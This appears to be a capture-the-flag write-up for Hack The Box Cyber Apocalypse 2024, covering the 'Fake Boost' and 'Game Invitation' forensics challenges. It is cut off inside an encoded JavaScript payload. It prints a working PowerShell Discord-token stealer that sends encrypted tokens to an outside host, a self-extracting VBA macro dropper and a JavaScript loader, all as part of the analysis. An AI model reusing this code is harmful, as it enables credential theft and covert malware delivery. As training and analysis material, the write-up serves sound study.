# Hack The Box Cyber Apocalypse 2024

## Table of Contents
- [forensics/fake_boost](#forensicsfake-boost)
- [forensics/game_invitation](#forensicsgame-invitation)
- [pwn/writing_on_the_wall](#pwnwriting-on-the-wall)
- [pwn/delulu](#pwndelulu)
- [pwn/rocket_blaster_xxx](#pwnrocket-blaster-xxx)
- [pwn/pet_companion](#pwnpet-companion)
- [pwn/sound_of_silence](#pwnsound-of-silence)

## Forensics/Fake Boost

We are given a .pcapng file so we will open it in Wireshark. The first thing I like to do when opening pcap files is to go to Statistics > Protocol Hiearchy

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/b39e4bf3-d291-49ad-8673-c56ba9763ce4)

We can see that there are some HTTP packets. 

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/3ef682e3-59ff-4de8-b7f3-0dfc20597f76)

Lets filter out those packets

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/ff8cd664-657e-48ac-b9b6-db08d276a5eb)

When we follow TCP stream 3, we can see the user sent a GET request for a discordnitro.ps1 file. Its content can also be viewed in Wireshark
After reading the script, it looks like the extremely long string is being reversed and decoded from base64.

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/38a289b3-08ea-4e65-8f9e-de0f53d3a604)

<details>
<summary>Output</summary>

```powershell
$URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"

function Steal {
    param (
        [string]$path
    )

    $tokens = @()

    try {
        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {
            
            try {
                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop

                foreach ($regex in @('[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}', 'mfa\.[\w-]{80,95}')) {
                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                        $_.Matches.Value
                    }
                }
            } catch {}
        }
    } catch {}

    return $tokens
}

function GenerateDiscordNitroCodes {
    param (
        [int]$numberOfCodes = 10,
        [int]$codeLength = 16
    )

    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $codes = @()

    for ($i = 0; $i -lt $numberOfCodes; $i++) {
        $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
        $codes += $code
    }

    return $codes
}

function Get-DiscordUserInfo {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    process {
        try {
            $Headers = @{
                "Authorization" = $Token
                "Content-Type" = "application/json"
                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
            }

            $Uri = "https://discord.com/api/v9/users/@me"

            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
            return $Response
        }
        catch {}
    }
}

function Create-AesManagedObject($key, $IV, $mode) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"

    if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
    elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
    elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
    elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
    elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}


    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

Write-Host "
______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ 
|  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
| |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `' / /'| |/' |`' / /'/ /| |
|  _| '__/ _ \/ _ \ | | | | / __|/ __/ _ \| '__/ _` | | . ` | | __| '__/ _ \    / /  |  /| |  / / / /_| |
| | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/
                                                                                                         
                                                                                                         "
Write-Host "Generating Discord nitro keys! Please be patient..."

$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"

$paths = @{
    'Google Chrome' = "$local\Google\Chrome\User Data\Default"
    'Brave' = "$local\BraveSoftware\Brave-Browser\User Data\Default\"
    'Opera' = "$roaming\Opera Software\Opera Stable"
    'Firefox' = "$roaming\Mozilla\Firefox\Profiles"
}

$headers = @{
    'Content-Type' = 'application/json'
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36'
}

$allTokens = @()
foreach ($platform in $paths.Keys) {
    $currentPath = $paths[$platform]

    if (-not (Test-Path $currentPath -PathType Container)) {continue}

    $tokens = Steal -path $currentPath
    $allTokens += $tokens
}

$userInfos = @()
foreach ($token in $allTokens) {
    $userInfo = Get-DiscordUserInfo -Token $token
    if ($userInfo) {
        $userDetails = [PSCustomObject]@{
            ID = $userInfo.id
            Email = $userInfo.email
            GlobalName = $userInfo.global_name
            Token = $token
        }
        $userInfos += $userDetails
    }
}

$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$payload = $userInfos | ConvertTo-Json -Depth 10
$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload

try {
    $headers = @{
        'Content-Type' = 'text/plain'
        'User-Agent' = 'Mozilla/5.0'
    }
    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
}
catch {}

Write-Host "Success! Discord Nitro Keys:"
$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
$keys | ForEach-Object { Write-Output $_ }
```

</details>

Browsing through the decoded powershell script, we find this

```
$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"
```

When we decode it from base64, we get

```
HTB{fr33_N17r0G3n_3xp053d!_
```

Thats neat but we still have to find the other part of the flag. Since we are even given the AES Key, it can be safe to assume that we will need to AES decrypt something.

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/d479b6d2-6d85-410a-8dbd-ced4bdf91ee2)

Looking back at the HTTP packets, there is a POST request to /rj1893rj1joijdkajwda which is the same as the URL defined in the powershell script. 

```
bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==
```

This is the encrypted data that we need to decrypt. Next, we will need the encryption key which can be obtained by decoding `Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=` from based64 to get `cWphrNTk9wgWZ93t19jayqnlaDuIeFKi`

Next, I will use an online [AES Decryption tool](https://www.devglan.com/online-tools/aes-encryption-decryption) to decrypt it.

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/6e8a94b5-5baa-43af-8b60-284dcc65ab6f)

```
ui(wyXØU(î6Nx[    {        "ID":  "1212103240066535494",        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",        "GlobalName":  "phreaks_admin",        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"    },    {        "ID":  "1212103240066535494",        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",        "GlobalName":  "phreaks_admin",        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"    }]
```

This is the output of the decryption.

If we take the email `YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9` and base64 decode it we will get

```
b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```

> Flag : HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}

## Forensics/Game Invitation

We are given a Microsoft Word 2007+ document. I will use [oletools](https://github.com/decalage2/oletools) to analyze the macros.

```bash
┌──(kali㉿kali)-[~/HTB2024/foren/invitation]
└─$ olevba --decode invitation.docm                       
```

<details>
<summary>Output</summary>

```vba
Public IAiiymixt As String
Public kWXlyKwVj As String


Function JFqcfEGnc(given_string() As Byte, length As Long) As Boolean
Dim xor_key As Byte
xor_key = 45
For i = 0 To length - 1
given_string(i) = given_string(i) Xor xor_key
xor_key = ((xor_key Xor 99) Xor (i Mod 254))
Next i
JFqcfEGnc = True
End Function

Sub AutoClose() 'delete the js script'
On Error Resume Next
Kill IAiiymixt
On Error Resume Next
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
aMUsvgOin.DeleteFile kWXlyKwVj & "\*.*", True
Set aMUsvgOin = Nothing
End Sub

Sub AutoOpen()
On Error GoTo MnOWqnnpKXfRO
Dim chkDomain As String
Dim strUserDomain As String
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then

Else

Dim gIvqmZwiW
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
gIvqmZwiW = FreeFile
Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW
Dim CbkQJVeAG() As Byte
ReDim CbkQJVeAG(file_length)
Get #gIvqmZwiW, 1, CbkQJVeAG
Dim SwMbxtWpP As String
SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
Dim vTxAnSEFH
    Set vTxAnSEFH = CreateObject("vbscript.regexp")
    vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
Dim Y5t4Ul7o385qK4YDhr
If I4j833DS5SFd34L3gwYQD.Count = 0 Then
GoTo MnOWqnnpKXfRO
End If
For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
Exit For
Next
Dim Wk4o3X7x1134j() As Byte
Dim KDXl18qY4rcT As Long
KDXl18qY4rcT = 13082
ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
Get #gIvqmZwiW, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO
End If
kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
kWXlyKwVj = Environ("appdata")
End If
Set aMUsvgOin = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
Open (IAiiymixt) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End If
End Sub
```

</details>

Looking at the script made my eyes bleed but I copied the script and pasted it into ChatGPT and asked it to reverse engineer it for me.

1. It reads the current document (itself) into a byte array
2. Uses a regex to search for string "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa" in the byte array
   
![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/d06be8a1-b882-40d8-9c92-f24b7959a5dd)

3. If not found, it exits. Else, it reads data from the index of the string.
4. It performs xor on the extracted data with JFqcfEGnc() function
5. It saves the content into mailform.js
6. It runs the file and passes "vF8rdgMHKBrvCoCp0ulm" as the argument

<details>
<summary>Extract Data Script</summary>

```python
filename = 'invitation.docm' 
search_string = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
output_filename = "mailform.js"

def extract_data_after_string(filename, search_string):
    try:
        with open(filename, 'rb') as file:
            binary_data = file.read()
            search_bytes = search_string.encode('utf-8')
            start_index = binary_data.find(search_bytes)
            if start_index != -1:
                extracted_data = binary_data[start_index + 80:]
                extracted_data = bytearray(extracted_data)
                return extracted_data
            else:
                print(f"String '{search_string}' not found in the binary data.")
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")

def xorrr(given_string, length):
    xor_key = 45
    for i in range(length):
        given_string[i] = given_string[i] ^ xor_key
        xor_key = ((xor_key ^ 99) ^ (i % 254))
    return given_string


data = extract_data_after_string(filename, search_string)
xor_data = xorrr(data, 13082)

with open(output_filename, 'wb') as f:
        f.write(xor_data)
```

</details>

I wrote this python script with the help of ChatGPT to extract the bytes. When we `cat mailform.js`, we will find javascript code and a blob of random data following the code. I just copy and pasted the javascript code out. Then, I put it into a [beautifer](https://codebeautify.org/jsviewer)

<details>
<summary>Beautified Code</summary>

```javascript
var lVky = WScript.Arguments;
var DASz = lVky(0)
var Iwlh = lyEK();
Iwlh = JrvS(Iwlh);
Iwlh = xR68(DASz, Iwlh);
eval(Iwlh);
function af5Q(r) {
  var a = r.charCodeAt(0);
  if (a === 43 || a === 45) return 62;
  if (a === 47 || a === 95) return 63;
  if (a < 48) return -1;
  if (a < 58) return a - 48 + 26 + 26;
  if (a < 91) return a - 65;
  if (a < 123) return a - 97 + 26;
}
function JrvS(r) {
  var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var t;
  var l;
  var h;
  if (r.length % 4 > 0) return;
  var u = r.length;
  var g = r.charAt(u - 2) === "=" ? 2 : r.charAt(u - 1) === "=" ? 1 : 0;
  var n = new Array(r.length * 3 / 4 - g);
  var i = g > 0 ? r.length - 4 : r.length;
  var z = 0;
  function b(r) {
    n[z++] = r;
  }
  for (t = 0, l = 0; t < i; t += 4, l += 3) {
    h = af5Q(r.charAt(t)) << 18 | af5Q(r.charAt(t + 1)) << 12 | af5Q(r.charAt(t + 2)) << 6 | af5Q(r.charAt(t + 3));
    b((h & 16711680) >> 16);
    b((h & 65280) >> 8);
    b(h & 255);
  }
  if (g === 2) {
    h = af5Q(r.charAt(t)) << 2 | af5Q(r.charAt(t + 1)) >> 4;
    b(h & 255);
  } else if (g === 1) {
    h = af5Q(r.charAt(t)) << 10 | af5Q(r.charAt(t + 1)) << 4 | af5Q(r.charAt(t + 2)) >> 2;
    b(h >> 8 & 255);
    b(h & 255);
  }
  return n;
}
function xR68(r, a) {
  var t = [];
  var l = 0;
  var h;
  var u = "";
  for (var g = 0; g < 256; g++) {
    t[g] = g;
  }
  for (var g = 0; g < 256; g++) {
    l = (l + t[g] + r.charCodeAt(g % r.length)) % 256;
    h = t[g];
    t[g] = t[l];
    t[l] = h;
  }
  var g = 0;
  var l = 0;
  for (var n = 0; n < a.length; n++) {
    g = (g + 1) % 256;
    l = (l + t[g]) % 256;
    h = t[g];
    t[g] = t[l];
    t[l] = h;
    u += String.fromCharCode(a[n] ^ t[(t[g] + t[l]) % 256]);
  }
  return u;
}
function lyEK() {
  var r = "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